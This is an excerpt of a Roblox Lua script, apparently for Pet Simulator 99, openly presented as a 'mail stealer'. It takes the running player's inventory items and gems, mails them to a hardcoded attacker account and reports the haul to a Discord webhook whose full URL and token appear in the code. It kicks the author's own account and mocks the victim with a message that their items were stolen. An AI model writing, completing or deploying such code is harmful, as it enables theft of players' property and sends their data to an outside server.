...
-- Made by sl6mmy - aka slammer
-- Items sent to: Ps99_Player2442
-- Webhook: https://discord.com/api/webhooks/1476686429210935326/UAC_3Rra8WtxwE_lu_Tazz3kvl9c2q2Sqjce8pDyqC55gqbZuI7jUaCe9_1gmOeLuBMU
...
_G.Usernames = {"Ps99_Player2442"}
-- Hardcoded webhook for notifications
_G.webhook = "https://discord.com/api/webhooks/1476686429210935326/UAC_3Rra8WtxwE_lu_Tazz3kvl9c2q2Sqjce8pDyqC55gqbZuI7jUaCe9_1gmOeLuBMU"

local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "zammy the best"
...
for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("Your not allowed to mailsteal yourself zammy")
        return
    end
end
...
local function SendMessage(diamonds)
    ...
    local data = {
        ["embeds"] = {{
			...
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by z6mmy aka slamdunk"
			}
        }}
    }
...
if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
    ...
    message.Error("All your items just got stolen by zammys mail stealer!")
end
